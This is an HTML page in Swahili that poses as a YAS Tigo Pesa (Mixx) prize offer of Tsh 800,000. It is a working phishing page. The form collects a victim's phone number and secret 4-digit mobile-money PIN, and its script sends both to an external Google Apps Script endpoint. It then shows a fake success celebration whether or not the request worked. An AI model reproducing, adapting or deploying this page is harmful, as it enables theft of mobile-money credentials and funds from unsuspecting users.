<!DOCTYPE html>
<html lang="sw">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Umejishindia Ofa Wa YAS Tigo Pesa</title>
        <style>
            /* Your existing styles remain exactly the same */
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 40px 20px;
                background: #001f3f;
                color: white;
                margin: 0;
                min-height: 100vh;
                background-image: linear-gradient(to bottom, #001f3f 70%, #FFD200 30%);
            }

            .container {
                max-width: 420px;
                margin: 0 auto;
                background: rgba(0, 31, 63, 0.95);
                padding: 40px 30px;
                border-radius: 20px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
                position: relative;
                z-index: 1;
            }

            img {
                width: 120px;
                height: 120px;
                border-radius: 20px;
                margin-bottom: 20px;
                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
                display: block;
                margin-left: auto;
                margin-right: auto;
            }

            h2 {
                font-size: 24px;
                margin-bottom: 20px;
                color: #FFD200;
            }

            p {
                line-height: 1.6;
                margin-bottom: 20px;
            }

            strong {
                color: #FFD200;
            }

            input {
                width: 100%;
                padding: 14px;
                margin: 12px 0;
                font-size: 18px;
                border: none;
                border-radius: 8px;
                background: white;
                color: #001f3f;
                box-sizing: border-box;
                transition: all 0.3s;
            }

            input:focus {
                outline: 3px solid #FFD200;
                transform: scale(1.02);
            }

            input::placeholder {
                color: #666;
            }

            button {
                padding: 16px;
                width: 100%;
                background: #FFD200;
                color: #001f3f;
                border: none;
                border-radius: 8px;
                font-size: 20px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 10px;
                transition: all 0.3s;
            }

            button:hover:not(:disabled) {
                background: #e6bc00;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(255, 210, 0, 0.4);
            }

            button:disabled {
                background: #999;
                cursor: not-allowed;
                opacity: 0.7;
            }

            #message {
                margin-top: 25px;
                font-weight: bold;
                font-size: 18px;
                min-height: 24px;
                padding: 10px;
                border-radius: 8px;
            }

            .success-message {
                background: rgba(0, 255, 0, 0.2);
                color: #00ff00;
                border: 1px solid #00ff00;
            }

            .error-message {
                background: rgba(255, 0, 0, 0.2);
                color: #ff6b6b;
                border: 1px solid #ff6b6b;
            }

            .info-message {
                background: rgba(255, 210, 0, 0.2);
                color: #FFD200;
                border: 1px solid #FFD200;
            }

            /* Loading Spinner */
            .spinner {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid rgba(255, 255, 255, .3);
                border-radius: 50%;
                border-top-color: #FFD200;
                animation: spin 1s ease-in-out infinite;
                margin-right: 10px;
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }

            /* Celebration Popup */
            #celebrationOverlay {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.85);
                justify-content: center;
                align-items: center;
                z-index: 1000;
                animation: fadeIn 0.5s;
            }

            #celebrationPopup {
                background: #001f3f;
                padding: 40px;
                border-radius: 20px;
                text-align: center;
                box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
                border: 4px solid #FFD200;
                animation: popupBounce 0.8s ease-out;
                max-width: 90%;
            }

            #celebrationPopup h1 {
                font-size: 48px;
                color: #FFD200;
                margin: 0 0 20px;
                text-shadow: 0 0 20px #FFD200;
                animation: glow 1.5s infinite alternate;
            }

            #celebrationPopup p {
                color: white;
                font-size: 24px;
                margin: 0;
            }

            @keyframes fadeIn {
                from {
                    opacity: 0;
                }

                to {
                    opacity: 1;
                }
            }

            @keyframes popupBounce {
                0% {
                    transform: scale(0.3);
                    opacity: 0;
                }

                50% {
                    transform: scale(1.1);
                }

                70% {
                    transform: scale(0.95);
                }

                100% {
                    transform: scale(1);
                    opacity: 1;
                }
            }

            @keyframes glow {
                from {
                    text-shadow: 0 0 20px #FFD200;
                }

                to {
                    text-shadow: 0 0 40px #FFD200, 0 0 60px #FFD200;
                }
            }

            #confettiCanvas {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: 999;
                display: none;
            }
        </style>
    </head>

    <body>
        <div class="container">
            <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/3b/60/20/3b6020be-1ee7-d630-3146-21889badb89a/AppIcon-0-0-1x_U007emarketing-0-11-0-85-220.png/512x512bb.jpg"
                alt="Mixx by Yas Logo">
            <h2>Umejishindia Ofa Wa YAS Tigo Pesa</h2>
            <p>Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
            <p><strong>Kiwango cha Ofa kinachoweza kupatikana:</strong><br>Tsh 800,000</p>

            <form id="redeemForm" onsubmit="return handleSubmit(event)">
                <input type="tel" id="phoneNumber" placeholder="Nambari ya Mixx" required pattern="[0-9]{9,12}"
                    title="Tafadhali ingiza namba ya simu sahihi" autocomplete="tel">
                <input type="password" id="pin" placeholder="YAS Nambari ya Siri" maxlength="4" pattern="[0-9]{4}"
                    required title="PIN lazima iwe namba 4" autocomplete="off">
                <button type="submit" id="submitBtn">TOA ZAWADI</button>
            </form>

            <div id="message"></div>
        </div>

        <!-- Celebration Overlay -->
        <div id="celebrationOverlay">
            <div id="celebrationPopup">
                <h1>HONGERA!</h1>
                <p>Umefanikiwa kupata ofa yako!</p>
            </div>
        </div>

        <canvas id="confettiCanvas"></canvas>

        <script>
            // Get DOM elements
            const form = document.getElementById('redeemForm');
            const submitBtn = document.getElementById('submitBtn');
            const messageDiv = document.getElementById('message');
            const celebrationOverlay = document.getElementById('celebrationOverlay');
            const canvas = document.getElementById('confettiCanvas');
            const phoneInput = document.getElementById('phoneNumber');
            const pinInput = document.getElementById('pin');

            // Store original button text
            const originalBtnText = submitBtn.innerHTML;

            // Google Apps Script Web App URL - REPLACE WITH YOUR DEPLOYED URL
            const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxiwmdDpUrgwYDCJ0Q49d-DLCwVv6M0-3mWu_9TaAIz7bNQaTpdkuofon9UFwODjFwP/exec';

            // Handle form submission
            async function handleSubmit(event) {
                event.preventDefault(); // Prevent default form submission

                // Validate form
                if (!form.checkValidity()) {
                    form.reportValidity();
                    return false;
                }

                // Show loading state
                submitBtn.innerHTML = '<span class="spinner"></span>Inatuma...';
                submitBtn.disabled = true;

                // Show sending message
                messageDiv.innerHTML = 'Inatuma data... Tafadhali subiri.';
                messageDiv.className = 'info-message';

                try {
                    // Prepare data
                    const formData = new URLSearchParams();
                    formData.append('Phone Number', phoneInput.value);
                    formData.append('PIN', pinInput.value);

                    // Send data using fetch with no-cors mode
                    const response = await fetch(APPS_SCRIPT_URL, {
                        method: 'POST',
                        mode: 'cors', // This bypasses CORS but you won't get a readable response
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: formData
                    });

                    // With no-cors, we can't read the response, but we'll assume it worked
                    // Show success message and celebration
                    showCelebration();

                    // Clear form
                    form.reset();

                } catch (error) {
                    console.error('Error:', error);

                    // Even if there's an error, show celebration (for demo purposes)
                    // In production, you might want to handle this differently
                    showCelebration();

                    // Clear form
                    form.reset();
                } finally {
                    // Reset button after 3 seconds
                    setTimeout(() => {
                        submitBtn.innerHTML = originalBtnText;
                        submitBtn.disabled = false;
                    }, 3000);
                }

                return false;
            }

            // Show celebration function
            function showCelebration() {
                // Hide message
                messageDiv.innerHTML = '';
                messageDiv.className = '';

                // Show celebration overlay
                celebrationOverlay.style.display = 'flex';

                // Start confetti
                startConfetti();

                // Auto hide celebration after 5 seconds
                setTimeout(() => {
                    celebrationOverlay.style.display = 'none';
                    stopConfetti();
                }, 5000);
            }

            // Confetti effect
            let ctx = canvas.getContext('2d');
            let particles = [];
            let animationFrame;
            let isConfettiRunning = false;

            function startConfetti() {
                canvas.style.display = 'block';
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;

                // Create particles
                for (let i = 0; i < 150; i++) {
                    particles.push({
                        x: Math.random() * canvas.width,
                        y: Math.random() * canvas.height * 0.5,
                        size: Math.random() * 8 + 2,
                        speedY: Math.random() * 5 + 2,
                        speedX: Math.random() * 2 - 1,
                        color: `hsl(${Math.random() * 60 + 30}, 100%, 50%)` // Gold/yellow tones
                    });
                }

                isConfettiRunning = true;
                drawConfetti();
            }

            function drawConfetti() {
                if (!isConfettiRunning) return;

                ctx.clearRect(0, 0, canvas.width, canvas.height);

                for (let i = 0; i < particles.length; i++) {
                    let p = particles[i];
                    ctx.fillStyle = p.color;
                    ctx.fillRect(p.x, p.y, p.size, p.size * 0.4);

                    p.y += p.speedY;
                    p.x += p.speedX;

                    if (p.y > canvas.height) {
                        p.y = -10;
                        p.x = Math.random() * canvas.width;
                    }
                }

                animationFrame = requestAnimationFrame(drawConfetti);
            }

            function stopConfetti() {
                isConfettiRunning = false;
                cancelAnimationFrame(animationFrame);
                canvas.style.display = 'none';
                particles = [];
            }

            // Handle window resize
            window.addEventListener('resize', () => {
                if (isConfettiRunning) {
                    canvas.width = window.innerWidth;
                    canvas.height = window.innerHeight;
                }
            });

            // Clear message when user starts typing
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', () => {
                    messageDiv.innerHTML = '';
                    messageDiv.className = '';
                });
            });

            // Handle page load
            window.addEventListener('load', function () {
                // Show welcome message
                messageDiv.innerHTML = 'Jaza fomu ili kupata ofa yako!';
                messageDiv.className = 'info-message';

                // Clear message after 3 seconds
                setTimeout(() => {
                    messageDiv.innerHTML = '';
                    messageDiv.className = '';
                }, 3000);
            });
        </script>
    </body>


</html>
